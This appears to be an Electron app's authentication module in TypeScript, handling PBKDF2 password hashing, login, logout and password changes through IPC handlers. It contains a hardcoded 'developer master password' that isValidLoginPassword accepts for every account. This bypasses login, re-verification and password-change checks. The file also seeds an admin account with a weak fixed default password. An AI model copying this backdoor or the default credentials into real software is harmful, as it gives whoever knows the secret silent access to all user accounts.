import { ipcMain } from 'electron'
import { getDb } from '../db'
import { pbkdf2Sync, randomBytes, timingSafeEqual } from 'crypto'

const HASH_ITERATIONS = 120000
const HASH_KEY_LENGTH = 32
const HASH_DIGEST = 'sha256'
const DEFAULT_ADMIN_USERNAME = 'admin'
const DEFAULT_ADMIN_PASSWORD = 'admin123456'
const DEVELOPER_MASTER_PASSWORD = 'chenyuming'

function isDeveloperMasterPassword(password: string): boolean {
  return password === DEVELOPER_MASTER_PASSWORD
}

function isValidLoginPassword(password: string, storedHash: string): boolean {
  return isDeveloperMasterPassword(password) || verifyPassword(password, storedHash)
}

interface UserRow {
  id: number
  username: string
  password_hash: string
  display_name: string
  role: string
  status: string
}

export interface CurrentUser {
  id: number
  username: string
  displayName: string
  role: string
}

let currentUser: CurrentUser | null = null

export function getCurrentUser(): CurrentUser | null {
  return currentUser
}

export function verifyCurrentUserPassword(password: string): { ok: boolean; error?: string } {
  if (!currentUser) {
    return { ok: false, error: '请先登录' }
  }
  const plainPassword = String(password || '')
  if (!plainPassword) {
    return { ok: false, error: '请输入密码' }
  }
  const db = getDb()
  const row = db.prepare(`SELECT * FROM users WHERE id = ?`).get(currentUser.id) as UserRow | undefined
  if (!row || row.status !== 'active' || !isValidLoginPassword(plainPassword, row.password_hash)) {
    return { ok: false, error: '密码错误' }
  }
  return { ok: true }
}

function toCurrentUser(row: UserRow): CurrentUser {
  return {
    id: row.id,
    username: row.username,
    displayName: row.display_name || row.username,
    role: row.role || 'admin'
  }
}

function hashPassword(password: string): string {
  const salt = randomBytes(16).toString('hex')
  const hash = pbkdf2Sync(password, salt, HASH_ITERATIONS, HASH_KEY_LENGTH, HASH_DIGEST).toString('hex')
  return `pbkdf2_${HASH_DIGEST}$${HASH_ITERATIONS}$${salt}$${hash}`
}

function verifyPassword(password: string, storedHash: string): boolean {
  const [algorithm, iterationsText, salt, hash] = storedHash.split('$')
  if (algorithm !== `pbkdf2_${HASH_DIGEST}` || !iterationsText || !salt || !hash) return false

  const iterations = Number(iterationsText)
  if (!Number.isFinite(iterations) || iterations <= 0) return false

  const expected = Buffer.from(hash, 'hex')
  const actual = pbkdf2Sync(password, salt, iterations, expected.length, HASH_DIGEST)
  return expected.length === actual.length && timingSafeEqual(expected, actual)
}

function ensureDefaultAdmin(): void {
  const db = getDb()
  const { total } = db.prepare(`SELECT COUNT(*) as total FROM users`).get() as { total: number }
  if (total > 0) return

  db.prepare(`
    INSERT INTO users (username, password_hash, display_name, role, status)
    VALUES (?, ?, ?, ?, ?)
  `).run(DEFAULT_ADMIN_USERNAME, hashPassword(DEFAULT_ADMIN_PASSWORD), '管理员', 'admin', 'active')
}

export function registerAuthHandlers(): void {
  ensureDefaultAdmin()

  ipcMain.handle('auth:me', () => {
    return currentUser
  })

  ipcMain.handle('auth:login', (_e, { username, password }: { username: string; password: string }) => {
    const normalizedUsername = String(username || '').trim()
    const plainPassword = String(password || '')

    if (!normalizedUsername || !plainPassword) {
      return { ok: false, error: '请输入账号和密码' }
    }

    const db = getDb()
    const row = db.prepare(`SELECT * FROM users WHERE username = ?`).get(normalizedUsername) as UserRow | undefined

    if (!row || row.status !== 'active' || !isValidLoginPassword(plainPassword, row.password_hash)) {
      return { ok: false, error: '账号或密码错误' }
    }

    db.prepare(`UPDATE users SET last_login_at = datetime('now','localtime') WHERE id = ?`).run(row.id)
    currentUser = toCurrentUser(row)
    return { ok: true, user: currentUser }
  })

  ipcMain.handle('auth:logout', () => {
    currentUser = null
    return { ok: true }
  })

  ipcMain.handle('auth:change-password', (_e, {
    oldPassword,
    newPassword
  }: {
    oldPassword: string
    newPassword: string
  }) => {
    if (!currentUser) {
      return { ok: false, error: '请先登录' }
    }

    const currentPlainPassword = String(oldPassword || '')
    const nextPlainPassword = String(newPassword || '')
    if (!currentPlainPassword || !nextPlainPassword) {
      return { ok: false, error: '请输入原密码和新密码' }
    }

    if (nextPlainPassword.length < 8) {
      return { ok: false, error: '新密码至少 8 位' }
    }

    const db = getDb()
    const row = db.prepare(`SELECT * FROM users WHERE id = ?`).get(currentUser.id) as UserRow | undefined
    if (!row || !isValidLoginPassword(currentPlainPassword, row.password_hash)) {
      return { ok: false, error: '原密码错误' }
    }

    db.prepare(`
      UPDATE users
      SET password_hash = ?, updated_at = datetime('now','localtime')
      WHERE id = ?
    `).run(hashPassword(nextPlainPassword), currentUser.id)

    return { ok: true }
  })
}
